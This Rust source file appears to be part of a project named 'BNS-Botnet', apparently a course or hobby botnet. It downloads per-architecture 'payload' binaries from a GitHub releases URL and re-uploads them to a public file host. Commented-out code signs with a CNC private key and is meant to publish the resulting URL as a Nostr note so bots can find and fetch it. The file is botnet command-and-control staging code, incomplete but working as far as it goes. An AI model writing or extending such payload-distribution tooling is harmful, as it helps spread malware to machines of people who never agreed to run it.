use std::collections::HashMap;

use bns_lib::FILE_STORAGE_SERVER;
use bytes::Bytes;
use nostr_sdk::Client;
use nostr_sdk::prelude::*;
use reqwest::Client as RClient;
use reqwest::multipart::Form;
use reqwest::multipart::Part;

mod payload;

const ARCHS: [&'static str; 2] = ["aarch64", "x86_64"];
const REPO: &'static str = "https://github.com/SenneW-2158088/BNS-Botnet/releases/download/main";
const PAYLOAD: &'static str = "payload";
const FILEDUMP: &'static str = "https://filedump.to/";

const RELAYS: [&str; 1] = [bns_lib::RELAY];

async fn download_payload(client: &RClient, architecture: &str) -> Result<Bytes, ()> {
    let url = format!("{}/{}-{}", REPO, PAYLOAD, architecture);
    let response = client.get(url).send().await.map_err(|e| ())?;
    let payload = response.bytes().await.map_err(|e| ())?;

    Ok(payload)
}

async fn run() -> Result<()> {
    let client = RClient::new();

    let mut payloads: HashMap<String, Bytes> = HashMap::new();

    println!("[i] Downloading payloads from github");
    for architecture in ARCHS {
        match download_payload(&client, architecture).await {
            Ok(payload) => {
                println!("[+] Downloaded payload for {}", architecture);
                payloads.insert(architecture.to_string(), payload);
            }
            Err(_) => println!("[-] Error getting payload for {}", architecture),
        }
    }

    println!("[i] Publishing payloads on filedump");
    let mut filedump_urls: HashMap<String, String> = HashMap::new();

    for (architecture, payload) in payloads {
        let form = Form::new().part("file", Part::bytes(payload.to_vec()));

        match client.post(FILEDUMP).multipart(form).send().await {
            Ok(response) => {
                let body = response.text().await.unwrap();
                println!("[+] Got body {}", body);
            }
            Err(_) => println!(
                "[-] Error uploading to filedump for architecture {}",
                architecture
            ),
        }
    }

    // Nu nog die url's serializen en uitprinten zodat we dit in een post kunnen steken

    // let keys: Keys = Keys::parse(bns_lib::CNC_PRIVATE_KEY)?;

    // let connection: Connection = Connection::new();
    // let opts = Options::new().connection(connection);
    // let client = Client::builder().signer(keys.clone()).opts(opts).build();

    // // uploading file
    // println!("[+] server_config");

    // let server_config =
    //     nip96::get_server_config(Url::parse(bns_lib::FILE_STORAGE_SERVER)?, None).await?;

    // println!("[+] allowed mimetypes: {:?}", server_config.content_types);

    // println!("[+] uploading data...");

    // let url = nip96::upload_data(
    //     &client.signer().await?,
    //     &server_config,
    //     contents,
    //     Some("text/plain"),
    //     None,
    // )
    // .await?;

    // println!("url: {}", url);

    // TODO: upload this url as a note, such that clients can find it

    // match client.upload_file(file_path, &contents) {
    //     Ok(_) => println!("File uploaded successfully."),
    //     Err(e) => eprintln!("Failed to upload file: {}", e),
    // }
    Ok(())
}

#[tokio::main]
async fn main() {
    match run().await {
        Err(e) => {
            println!("Got an error {}", e.to_string())
        }
        _ => println!("Succeeded"),
    }
}
